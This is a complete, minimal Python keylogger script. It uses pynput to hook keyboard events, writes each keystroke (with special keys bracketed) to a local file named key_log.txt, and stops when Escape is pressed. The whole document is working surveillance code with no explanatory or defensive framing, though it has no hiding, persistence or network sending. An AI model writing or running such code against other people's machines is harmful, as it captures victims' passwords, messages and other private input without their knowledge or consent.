from pynput import keyboard

# File to store the logs
log_file = "key_log.txt"

# Function to write keystrokes to file
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Special keys (e.g., shift, ctrl) will cause an AttributeError
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

def on_release(key):
    # Stop listener by pressing the escape key
    if key == keyboard.Key.esc:
        return False

# Setting up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
